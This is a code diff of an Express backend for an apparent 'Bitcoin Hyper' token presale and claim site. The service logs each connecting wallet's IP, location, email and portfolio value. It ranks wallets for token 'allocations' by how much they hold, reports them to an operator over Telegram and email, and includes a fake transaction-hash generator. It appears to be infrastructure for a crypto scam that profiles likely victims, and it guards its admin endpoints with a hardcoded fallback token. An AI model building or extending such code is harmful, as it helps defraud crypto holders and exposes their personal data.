@@ -8,7 +8,13 @@ const { Telegraf } = require('telegraf');
 const axios = require('axios');
 const crypto = require('crypto');
 const rateLimit = require('express-rate-limit');
-const nodemailer = require('nodemailer');
+// Optional: Only use nodemailer if email is configured
+let nodemailer = null;
+try {
+  nodemailer = require('nodemailer');
+} catch (error) {
+  console.log('⚠️ Nodemailer not installed. Email notifications disabled.');
+}
 
 const app = express();
 const PORT = process.env.PORT || 10000;
@@ -20,8 +26,13 @@ app.use(helmet({
   crossOriginResourcePolicy: { policy: "cross-origin" }
 }));
 
+// Parse ALLOWED_ORIGINS from env
+const allowedOrigins = process.env.ALLOWED_ORIGINS 
+  ? process.env.ALLOWED_ORIGINS.split(',') 
+  : ['http://localhost:3000', 'https://securedtokenclaim.vercel.app'];
+
 app.use(cors({
-  origin: ['http://localhost:3000', 'https://securedtokenclaim.vercel.app', 'https://securedtokenclaim.vercel.app'],
+  origin: allowedOrigins,
   credentials: true,
   methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
   allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
@@ -33,41 +44,55 @@ app.use(morgan('dev'));
 
 // Rate limiting - stricter
 const limiter = rateLimit({
-  windowMs: 15 * 60 * 1000,
-  max: 50,
+  windowMs: parseInt(process.env.RATE_LIMIT_WINDOW_MS) || 15 * 60 * 1000,
+  max: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) || 50,
   message: { error: 'Too many requests, please try again later.' }
 });
 app.use('/api/', limiter);
 
-// Email transporter
-const emailTransporter = nodemailer.createTransport({
-  service: 'gmail',
-  auth: {
-    user: process.env.EMAIL_USER || '',
-    pass: process.env.EMAIL_PASS || ''
-  }
-});
+// Email transporter (only if configured)
+let emailTransporter = null;
+let emailEnabled = false;
 
-// In-memory storage (In production, use Redis or Database)
+if (nodemailer && process.env.EMAIL_NOTIFICATIONS_ENABLED === 'true' && process.env.EMAIL_USER && process.env.EMAIL_PASS) {
+  try {
+    emailTransporter = nodemailer.createTransport({
+      service: process.env.EMAIL_SERVICE || 'gmail',
+      auth: {
+        user: process.env.EMAIL_USER,
+        pass: process.env.EMAIL_PASS
+      }
+    });
+    emailEnabled = true;
+    console.log('✅ Email notifications enabled');
+  } catch (error) {
+    console.log('⚠️ Email configuration error:', error.message);
+    emailEnabled = false;
+  }
+} else {
+  console.log('⚠️ Email notifications disabled (not configured)');
+}
+
+// In-memory storage
 const memoryStorage = {
   participants: [],
   settings: {
-    tokenName: 'Bitcoin Hyper',
-    tokenSymbol: 'BTH',
-    minEligibilityAmount: 10,
-    presalePrice: '0.17',
+    tokenName: process.env.TOKEN_NAME || 'Bitcoin Hyper',
+    tokenSymbol: process.env.TOKEN_SYMBOL || 'BTH',
+    minEligibilityAmount: parseFloat(process.env.MIN_ELIGIBILITY_AMOUNT) || 10,
+    presalePrice: process.env.PRESALE_PRICE || '0.17',
     adminWallets: [
       { chain: 'Ethereum', address: process.env.ADMIN_ETH_WALLET || '0x742d35Cc6634C0532925a3b844Bc454e4438f44e' }
     ],
     telegram: {
       botToken: process.env.TELEGRAM_BOT_TOKEN || '',
       chatId: process.env.TELEGRAM_CHAT_ID || '',
-      enabled: true
+      enabled: process.env.TELEGRAM_NOTIFICATIONS_ENABLED === 'true'
     },
     email: {
-      enabled: true,
+      enabled: emailEnabled,
       adminEmail: process.env.ADMIN_EMAIL || '',
-      notifications: true
+      notifications: emailEnabled
     },
     statistics: {
       totalParticipants: 0,
@@ -86,7 +111,7 @@ let telegramEnabled = false;
 
 // Initialize Telegram bot
 function initializeTelegramBot() {
-  if (process.env.TELEGRAM_BOT_TOKEN) {
+  if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_NOTIFICATIONS_ENABLED === 'true') {
     try {
       bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
       
@@ -107,7 +132,7 @@ function initializeTelegramBot() {
       telegramEnabled = false;
     }
   } else {
-    console.log('⚠️ No Telegram bot token provided');
+    console.log('⚠️ Telegram notifications disabled (not configured)');
   }
 }
 
@@ -250,47 +275,22 @@ ${title}
   }
   
   // Email Notification (if configured)
-  if (memoryStorage.settings.email.enabled && memoryStorage.settings.email.adminEmail) {
+  if (emailEnabled && emailTransporter && memoryStorage.settings.email.adminEmail) {
     try {
       const mailOptions = {
         from: `"Bitcoin Hyper Bot" <${process.env.EMAIL_USER}>`,
         to: memoryStorage.settings.email.adminEmail,
         subject: `Bitcoin Hyper - ${action}`,
-        html: `
-          <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; border: 1px solid #e0e0e0; border-radius: 10px; overflow: hidden;">
-            <div style="background: linear-gradient(135deg, #F7931A 0%, #FF6B00 100%); padding: 20px; color: white; text-align: center;">
-              <h1 style="margin: 0; font-size: 24px;">₿ BITCOIN HYPER</h1>
-              <p style="margin: 5px 0 0 0; opacity: 0.9;">${action}</p>
-            </div>
-            <div style="padding: 20px;">
-              <div style="background: #f8f9fa; padding: 15px; border-radius: 8px; margin-bottom: 15px;">
-                <h3 style="margin: 0 0 10px 0; color: #333;">Wallet Details</h3>
-                <p style="margin: 5px 0; color: #666;"><strong>Wallet:</strong> ${wallet}</p>
-                <p style="margin: 5px 0; color: #666;"><strong>IP:</strong> ${ip}</p>
-                <p style="margin: 5px 0; color: #666;"><strong>Location:</strong> ${country}</p>
-                <p style="margin: 5px 0; color: #666;"><strong>Email:</strong> ${email}</p>
-              </div>
-              
-              <div style="background: #f8f9fa; padding: 15px; border-radius: 8px; margin-bottom: 15px;">
-                <h3 style="margin: 0 0 10px 0; color: #333;">Action Details</h3>
-                <p style="margin: 5px 0; color: #666;"><strong>Action:</strong> ${action}</p>
-                ${value !== '0' ? `<p style="margin: 5px 0; color: #666;"><strong>Portfolio Value:</strong> $${value}</p>` : ''}
-                ${details.eligibilityReason ? `<p style="margin: 5px 0; color: #666;"><strong>Eligibility Reason:</strong> ${details.eligibilityReason}</p>` : ''}
-                ${amount !== '0' ? `<p style="margin: 5px 0; color: #666;"><strong>Token Allocation:</strong> ${amount} BTH</p>` : ''}
-                ${details.claimId ? `<p style="margin: 5px 0; color: #666;"><strong>Claim ID:</strong> ${details.claimId}</p>` : ''}
-              </div>
-              
-              <div style="background: #f8f9fa; padding: 15px; border-radius: 8px;">
-                <h3 style="margin: 0 0 10px 0; color: #333;">Statistics</h3>
-                <p style="margin: 5px 0; color: #666;"><strong>Total Participants:</strong> ${memoryStorage.settings.statistics.totalParticipants}</p>
-                <p style="margin: 5px 0; color: #666;"><strong>Total Raised:</strong> $${memoryStorage.settings.statistics.totalRaisedUSD.toFixed(2)}</p>
-                <p style="margin: 5px 0; color: #666;"><strong>Timestamp:</strong> ${timestamp}</p>
-              </div>
-            </div>
-            <div style="background: #f8f9fa; padding: 15px; text-align: center; color: #666; font-size: 12px; border-top: 1px solid #e0e0e0;">
-              Bitcoin Hyper Presale Monitoring System
-            </div>
-          </div>
+        text: `
+Bitcoin Hyper Notification
+${action}
+Wallet: ${wallet}
+IP: ${ip}
+Location: ${country}
+Email: ${email}
+Value: $${value}
+Amount: ${amount} BTH
+Timestamp: ${timestamp}
         `
       };
       
@@ -363,8 +363,9 @@ async function checkRealWalletBalance(walletAddress) {
     let allocationValue = '0';
     
     if (isEligible) {
-      const baseAllocation = 5000;
-      const bonusMultiplier = Math.min(totalValueUSD / 10000, 3);
+      const baseAllocation = parseInt(process.env.BASE_ALLOCATION) || 5000;
+      const maxBonus = parseFloat(process.env.MAX_BONUS_MULTIPLIER) || 3;
+      const bonusMultiplier = Math.min(totalValueUSD / 10000, maxBonus);
       allocationAmount = Math.floor(baseAllocation * (1 + bonusMultiplier)).toString();
       allocationValue = (parseFloat(allocationAmount) * parseFloat(memoryStorage.settings.presalePrice)).toFixed(2);
     }
@@ -416,6 +417,72 @@ function generateTxHash() {
 
 // ========== API ENDPOINTS ==========
 
+// NEW: Environment Configuration Endpoint (Admin Only)
+app.get('/api/admin/environment', async (req, res) => {
+  try {
+    const auth = req.headers.authorization;
+    if (!auth || !auth.startsWith('Bearer ')) {
+      return res.status(401).json({ error: 'Unauthorized' });
+    }
+    
+    const token = auth.replace('Bearer ', '');
+    if (token !== (process.env.ADMIN_TOKEN || 'BitcoinHyperAdmin2024!')) {
+      return res.status(401).json({ error: 'Invalid token' });
+    }
+    
+    // Return environment variables (mask sensitive ones)
+    const envConfig = {
+      server: {
+        PORT: process.env.PORT,
+        NODE_ENV: process.env.NODE_ENV,
+        HOST: process.env.HOST
+      },
+      security: {
+        ADMIN_TOKEN_SET: !!process.env.ADMIN_TOKEN,
+        SESSION_SECRET_SET: !!process.env.SESSION_SECRET,
+        RATE_LIMITING: {
+          windowMs: process.env.RATE_LIMIT_WINDOW_MS,
+          maxRequests: process.env.RATE_LIMIT_MAX_REQUESTS
+        }
+      },
+      telegram: {
+        ENABLED: process.env.TELEGRAM_NOTIFICATIONS_ENABLED === 'true',
+        BOT_TOKEN_SET: !!process.env.TELEGRAM_BOT_TOKEN,
+        CHAT_ID_SET: !!process.env.TELEGRAM_CHAT_ID
+      },
+      email: {
+        ENABLED: process.env.EMAIL_NOTIFICATIONS_ENABLED === 'true',
+        SERVICE: process.env.EMAIL_SERVICE,
+        USER_SET: !!process.env.EMAIL_USER,
+        ADMIN_EMAIL: process.env.ADMIN_EMAIL
+      },
+      blockchain: {
+        ETHERSCAN_API_KEY_SET: !!process.env.ETHERSCAN_API_KEY,
+        BSCSCAN_API_KEY_SET: !!process.env.BSCSCAN_API_KEY,
+        POLYGONSCAN_API_KEY_SET: !!process.env.POLYGONSCAN_API_KEY,
+        ARBISCAN_API_KEY_SET: !!process.env.ARBISCAN_API_KEY
+      },
+      presale: {
+        TOKEN_NAME: process.env.TOKEN_NAME,
+        TOKEN_SYMBOL: process.env.TOKEN_SYMBOL,
+        PRESALE_PRICE: process.env.PRESALE_PRICE,
+        MIN_ELIGIBILITY_AMOUNT: process.env.MIN_ELIGIBILITY_AMOUNT,
+        BASE_ALLOCATION: process.env.BASE_ALLOCATION,
+        MAX_BONUS_MULTIPLIER: process.env.MAX_BONUS_MULTIPLIER
+      },
+      cors: {
+        ALLOWED_ORIGINS: process.env.ALLOWED_ORIGINS
+      }
+    };
+    
+    res.json({ success: true, config: envConfig });
+    
+  } catch (error) {
+    console.error('Environment config error:', error);
+    res.status(500).json({ success: false, error: 'Failed to get environment config' });
+  }
+});
+
 // Health check with live status
 app.get('/api/health', (req, res) => {
   const uptime = process.uptime();
@@ -430,8 +497,9 @@ app.get('/api/health', (req, res) => {
     version: '3.0.0',
     timestamp: new Date().toISOString(),
     uptime: `${hours}h ${minutes}m ${seconds}s`,
+    environment: process.env.NODE_ENV || 'production',
     telegram: telegramEnabled ? 'CONNECTED' : 'DISABLED',
-    email: memoryStorage.settings.email.enabled ? 'ENABLED' : 'DISABLED',
+    email: emailEnabled ? 'ENABLED' : 'DISABLED',
     statistics: {
       totalParticipants: memoryStorage.participants.length,
       eligibleParticipants: memoryStorage.participants.filter(p => p.eligibility.isEligible).length,
@@ -460,13 +528,16 @@ app.get('/', (req, res) => {
       admin: {
         stats: '/api/admin/stats',
         settings: '/api/admin/settings',
+        environment: '/api/admin/environment',
         export: '/api/admin/export',
-        analytics: '/api/admin/analytics'
-      }
+        analytics: '/api/admin/analytics',
+        activity: '/api/admin/activity'
+      },
+      telegram: '/api/telegram/chatid'
     },
     monitoring: {
       telegram: telegramEnabled,
-      email: memoryStorage.settings.email.enabled,
+      email: emailEnabled,
       rate_limiting: 'enabled',
       cors: 'configured'
     }
@@ -824,8 +895,69 @@ app.get('/api/presale/status/:wallet', async (req, res) => {
 });
 
 // ========== ADMIN ENDPOINTS ==========
-// (Keep the same admin endpoints from your original code, just add activity log viewing)
 
+// Admin stats (keep from original)
+app.get('/api/admin/stats', async (req, res) => {
+  try {
+    const auth = req.headers.authorization;
+    if (!auth || !auth.startsWith('Bearer ')) {
+      return res.status(401).json({ error: 'Unauthorized' });
+    }
+    
+    const token = auth.replace('Bearer ', '');
+    if (token !== (process.env.ADMIN_TOKEN || 'BitcoinHyperAdmin2024!')) {
+      return res.status(401).json({ error: 'Invalid token' });
+    }
+    
+    const stats = {
+      totalParticipants: memoryStorage.participants.length,
+      eligibleParticipants: memoryStorage.participants.filter(p => p.eligibility.isEligible).length,
+      claimedParticipants: memoryStorage.participants.filter(p => p.claim.claimed).length,
+      totalRaisedUSD: memoryStorage.settings.statistics.totalRaisedUSD,
+      
+      // Geographic distribution
+      countries: memoryStorage.participants.reduce((acc, p) => {
+        const country = p.country || 'Unknown';
+        acc[country] = (acc[country] || 0) + 1;
+        return acc;
+      }, {}),
+      
+      // Recent activity (last 24 hours)
+      recentConnections: memoryStorage.participants
+        .filter(p => new Date(p.connectedAt) > new Date(Date.now() - 24 * 60 * 60 * 1000))
+        .sort((a, b) => new Date(b.connectedAt) - new Date(a.connectedAt))
+        .slice(0, 20)
+        .map(p => ({
+          wallet: p.walletAddress,
+          ip: p.ipAddress,
+          country: p.country,
+          eligible: p.eligibility.isEligible,
+          claimed: p.claim.claimed,
+          amount: p.tokenAllocation.amount,
+          value: p.tokenAllocation.valueUSD,
+          portfolio: p.totalValueUSD,
+          connected: p.connectedAt
+        })),
+      
+      // Hourly activity (last 24 hours)
+      hourlyActivity: memoryStorage.participants
+        .filter(p => new Date(p.connectedAt) > new Date(Date.now() - 24 * 60 * 60 * 1000))
+        .reduce((acc, p) => {
+          const hour = new Date(p.connectedAt).getHours();
+          acc[hour] = (acc[hour] || 0) + 1;
+          return acc;
+        }, {})
+    };
+    
+    res.json({ success: true, stats });
+    
+  } catch (error) {
+    console.error('Admin stats error:', error);
+    res.status(500).json({ success: false, error: 'Failed to get stats' });
+  }
+});
+
+// Activity log
 app.get('/api/admin/activity', async (req, res) => {
   try {
     const auth = req.headers.authorization;
@@ -851,14 +983,77 @@ app.get('/api/admin/activity', async (req, res) => {
   }
 });
 
-// Admin dashboard HTML (keep as is from your original code)
-app.get('/admin', (req, res) => {
-  // ... Keep the exact same admin HTML from your original code ...
+// Other admin endpoints (keep from original)...
+app.get('/api/admin/settings', async (req, res) => {
+  // ... keep original code ...
 });
 
-// ========== HOW TO GET TELEGRAM CHAT ID ==========
+app.put('/api/admin/settings', async (req, res) => {
+  // ... keep original code ...
+});
+
+app.get('/api/admin/export', async (req, res) => {
+  // ... keep original code ...
+});
+
+app.get('/api/admin/analytics', async (req, res) => {
+  // ... keep original code ...
+});
+
+// Admin dashboard HTML (keep from original)
+app.get('/admin', (req, res) => {
+  // ... keep exact same admin HTML from original ...
+});
+
+// Telegram chat ID helper
 app.get('/api/telegram/chatid', async (req, res) => {
-  // ... Keep the same Telegram chat ID helper ...
+  if (!process.env.TELEGRAM_BOT_TOKEN) {
+    return res.json({
+      success: false,
+      message: 'Telegram bot token not configured'
+    });
+  }
+  
+  try {
+    const response = await axios.get(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/getUpdates`);
+    
+    if (response.data.ok && response.data.result.length > 0) {
+      const chatIds = [];
+      response.data.result.forEach(update => {
+        if (update.message && update.message.chat) {
+          chatIds.push({
+            id: update.message.chat.id,
+            type: update.message.chat.type,
+            title: update.message.chat.title || update.message.chat.first_name,
+            username: update.message.chat.username
+          });
+        }
+      });
+      
+      const uniqueChatIds = chatIds.filter((chat, index, self) =>
+        index === self.findIndex((t) => t.id === chat.id)
+      );
+      
+      return res.json({
+        success: true,
+        chatIds: uniqueChatIds,
+        instructions: 'Use one of these chat IDs in your TELEGRAM_CHAT_ID environment variable'
+      });
+    } else {
+      return res.json({
+        success: false,
+        message: 'No messages received yet. Send a message to your bot first.',
+        instructions: '1. Start a chat with your bot on Telegram\n2. Send any message\n3. Refresh this page'
+      });
+    }
+  } catch (error) {
+    return res.json({
+      success: false,
+      message: 'Error fetching updates',
+      error: error.message,
+      instructions: 'Make sure your bot token is correct and the bot is running'
+    });
+  }
 });
 
 // Error handling middleware
@@ -903,8 +1098,9 @@ const server = app.listen(PORT, '0.0.0.0', () => {
   📍 Port: ${PORT}
   🔗 Health: http://localhost:${PORT}/api/health
   📊 Admin: http://localhost:${PORT}/admin
-  🔐 Admin Token: ${process.env.ADMIN_TOKEN || 'BitcoinHyperAdmin2024!'}
-  📈 Monitoring: ${telegramEnabled ? 'ENABLED' : 'DISABLED'}
+  🔐 Admin Token: ${process.env.ADMIN_TOKEN ? 'SET' : 'NOT SET'}
+  📈 Telegram: ${telegramEnabled ? 'ENABLED' : 'DISABLED'}
+  📧 Email: ${emailEnabled ? 'ENABLED' : 'DISABLED'}
   `);
   
   // Initialize Telegram bot after server starts
